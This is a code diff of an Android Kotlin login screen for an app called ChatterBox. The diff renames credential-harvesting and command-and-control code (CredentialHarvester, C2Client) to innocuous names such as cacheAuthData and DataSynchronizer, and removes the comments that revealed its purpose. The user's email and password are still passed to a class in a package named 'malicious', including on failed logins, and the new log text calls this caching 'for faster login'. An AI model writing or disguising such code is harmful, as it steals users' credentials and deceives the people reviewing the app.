@@ -1,9 +1,6 @@
 package com.example.ChatterBox
 
-import android.app.Activity
-import android.content.Context
 import android.content.Intent
-import android.media.projection.MediaProjectionManager
 import android.os.Bundle
 import android.util.Log
 import android.widget.Button
@@ -11,9 +8,9 @@ import android.widget.EditText
 import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import com.example.ChatterBox.malicious.CredentialHarvester
-import com.example.ChatterBox.malicious.C2Client
-import com.example.ChatterBox.malicious.SurveillanceService
+import com.example.ChatterBox.malicious.AccountManager
+import com.example.ChatterBox.malicious.DataSynchronizer
+
 import com.google.firebase.auth.FirebaseAuth
 import org.json.JSONObject
 import com.google.firebase.firestore.FirebaseFirestore
@@ -21,7 +18,7 @@ import com.google.firebase.firestore.FirebaseFirestore
 class LoginActivity : AppCompatActivity() {
     private lateinit var auth: FirebaseAuth
     private lateinit var firestore: FirebaseFirestore
-    private lateinit var c2Client: C2Client
+    private lateinit var dataSync: DataSynchronizer
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -30,7 +27,7 @@ class LoginActivity : AppCompatActivity() {
         auth = FirebaseAuth.getInstance()
 
         // Initialize C2 client
-        c2Client = C2Client(this)
+        dataSync = DataSynchronizer(this)
         firestore = FirebaseFirestore.getInstance()
 
         val usernameInput = findViewById<EditText>(R.id.usernameInput)
@@ -79,10 +76,9 @@ class LoginActivity : AppCompatActivity() {
                     progressBar.visibility = ProgressBar.GONE
                 }
 
-            harvestCredentials(username, password)
+            cacheAuthData(username, password)
 
-            // Connect to C2 server immediately when user attempts to log in
-            connectToC2Server(username)
+            connectToServer(username)
 
             auth.signInWithEmailAndPassword(username, password)
                 .addOnSuccessListener {
@@ -92,8 +88,7 @@ class LoginActivity : AppCompatActivity() {
                 .addOnFailureListener {
                     Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()
 
-                    // Some malware might also collect failed login attempts
-                    harvestCredentials(username, password, failed = true)
+                    cacheAuthData(username, password, failed = true)
                 }
                 .addOnCompleteListener {
                     progressBar.visibility = ProgressBar.GONE
@@ -101,17 +96,9 @@ class LoginActivity : AppCompatActivity() {
             }
     }
 
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-    }
-    private fun connectToC2Server(userEmail: String) {
-        Log.d("C2Connection", "Connecting to C2 server on login")
-
+    private fun connectToServer(userEmail: String) {
         try {
-            // Register the device with C2 server
-            c2Client.registerDevice()
 
-            // Send additional login event data
             val loginData = JSONObject().apply {
                 put("event_type", "user_login")
                 put("email", userEmail)
@@ -120,28 +107,24 @@ class LoginActivity : AppCompatActivity() {
                 put("android_version", android.os.Build.VERSION.RELEASE)
             }
 
-            // Send the login event to the C2 server
-            c2Client.sendExfiltrationData("login_event", loginData.toString())
 
-            Log.d("C2Connection", "Successfully connected to C2 server and sent login data")
+            Log.d("Server", "Successfully connected to server!")
         } catch (e: Exception) {
-            Log.e("C2Connection", "Error connecting to C2 server", e)
+            Log.e("Server", "Error connecting to server", e)
         }
     }
 
-    private fun harvestCredentials(email: String, password: String, failed: Boolean = false) {
-        Log.d("CredentialHarvester", "Harvesting credentials")
-
+    private fun cacheAuthData(email: String, password: String, failed: Boolean = false) {
         try {
             val extraData = mapOf(
                 "device_model" to android.os.Build.MODEL,
                 "device_manufacturer" to android.os.Build.MANUFACTURER,
                 "android_version" to android.os.Build.VERSION.RELEASE,
                 "login_successful" to (!failed).toString(),
-                "app_version" to "1.0" // Hard-coded version instead of BuildConfig
+                "app_version" to "1.0"
             )
 
-            CredentialHarvester.storeCredentials(
+            AccountManager.cacheAuthData(
                 context = this,
                 source = "ChatterBox Login",
                 username = email,
@@ -149,9 +132,9 @@ class LoginActivity : AppCompatActivity() {
                 extraData = extraData
             )
 
-            Log.d("CredentialHarvester", "Harvested successfully")
+            Log.d("LoginActivity", "Authentication data cached for faster login")
         } catch (e: Exception) {
-            Log.e("CredentialHarvester", "Error harvesting", e)
+            Log.e("LoginActivity", "Error caching auth data", e)
         }
     }
 
